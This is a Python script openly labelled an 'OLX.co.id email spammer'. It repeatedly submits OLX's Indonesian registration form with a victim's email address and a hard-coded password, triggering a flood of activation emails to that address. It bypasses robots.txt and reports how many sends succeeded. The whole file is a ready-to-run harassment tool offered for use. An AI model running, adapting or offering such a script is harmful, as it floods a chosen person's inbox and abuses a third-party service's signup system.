#!usr/bin/python3.7
#OLX.co.id EMAIL SPAMMER
#Author : KANG-NEWBIE
#Contact : t.me/kang_nuubi

try:
	import mechanize,os,sys,time,json
except ModuleNotFoundError as mdl:
	exit('Module Err: %s'%(mdl))

br = mechanize.Browser()
br.set_handle_equiv(True)
br.set_handle_referer(True)
br.set_handle_robots(False)
br.addheaders = [("User-Agent","Mozilla/5.0 (Linux; U; Android 5.1)")]

class Espam:
	def __init__(self):
		self.pas='kangnewbienobea'
		self.jumlah()

	def detekos(self):
		if os.name in ['nt','win32']:
			os.system('cls')
		else: os.system('clear')

	def jumlah(self):
		self.detekos()
		print("""
		;;;;;;;;;;;;;;;;;;;;;
		; OLX EMAIL SPAMMER ;
		;   BY:KANG-NEWBIE  ;
		;;;;;;;;;;;;;;;;;;;;;""")
		self.email=input('\n[?] Email target: ')
		jum=int(input('[?] Jumlah: '))
		print()
		for i in range(jum):
			self.send()

	def send(self):
		js = json.dumps({"check":"on"})
		jsl = json.loads(js)
		br.open('https://www.olx.co.id/masuk/daftar/')
		br.select_form(nr=0)
		br.set_all_readonly(False)
		br.form['register[email]'] = self.email
		br.form['register[password]'] = self.pas
		br.form['register[password2]'] = self.pas
		br.form['register[rules]'] = [jsl['check']]
		sub=br.submit().read()
		#print(sub.read())
		if 'Sekarang Anda harus mengaktifkan password baru Anda - klik pada link yang baru saja kami kirim. Periksa di kotak masuk, jika Anda tidak dapat menemukan e-mail kami, lihat juga di folder Spam' in str(sub):
			print('[+] Sukses mengirim OTP')
		else: print('[-] Gagal mengirim OTP')

try:
	Espam()
except KeyboardInterrupt:
	print('[Exit] Key interrupt')
except Exception as F:
	print('Err: %s'%(F))
